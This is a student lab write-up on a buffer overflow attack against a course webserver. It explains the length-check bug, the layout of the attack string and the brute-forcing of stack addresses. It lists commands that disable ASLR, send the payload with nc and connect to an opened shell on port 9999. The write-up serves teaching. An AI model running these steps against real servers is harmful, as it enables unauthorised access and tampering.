Project 2: Hack Into a Server

For this project, our objective was to use a buffer overflow attack to compromise a 32-bit Linux server.

First, we had to find the vulnerability in webserver.c. After looking through the code, we discovered that the method 'check_filename_length' took in the length argument as a byte rather than an int. This meant that as long as the last 8 bits of a number were less than 100, this check would be satisfied, thus calling strncopy, and potentially overflowing the buffer.

After finding the vulnerability, we began the process of writing our attack string to overflow the buffer. The first part of the string consisted of repeating the return address 50 times. The second part consisted of the No-ops which were repeated 500 times. The last part consisted of the shell code from shell-storm. 

The process of finding the return addresses was different for the two types of servers. For the local server, we used gdb to identify the correct address. For the remote server, we started at the top of the stack (0xbfffffff) and then decremented in multiples of 500 (nop-sled length) until we found the right address (0xbffffe0b).

Relevant commands to run program:

---turn off randomized virtual addressing---
setarch `uname -m` -R /bin/bash


---compile webserver---
gcc -m32 -z execstack -fno-stack-protector webserver.c -o webserver


---run executable 'webserver'---
./webserver


---compile shellcode.c---
g++ shellcode.c -o shellcode


---run executable 'shellcode'---
./shellcode


---shellcode.c generates an output.dat file which is sent as a request to the server---
cat output.dat | nc 310test.cs.duke.edu 9470


---connect to the shell that opens port 9999 (port number that was chosen randomly to be part of our shell code)---
nc 310test.cs.duke.edu 9999

Once in the shell, we deleted the original index.html file and used vim to create a new index.html file to say Hello World. Being able to make changes in such a file on the server shows how dangerous overflowing the buffer can be. 

Review of project:

We thought this project was a good introduction to how to interface with a server and a good review of stack architecture and addressing. We had the most trouble with figuring out the proper commandline syntax and understanding the usage of different ports. Successfully hacking the remote server was very satisfying.    
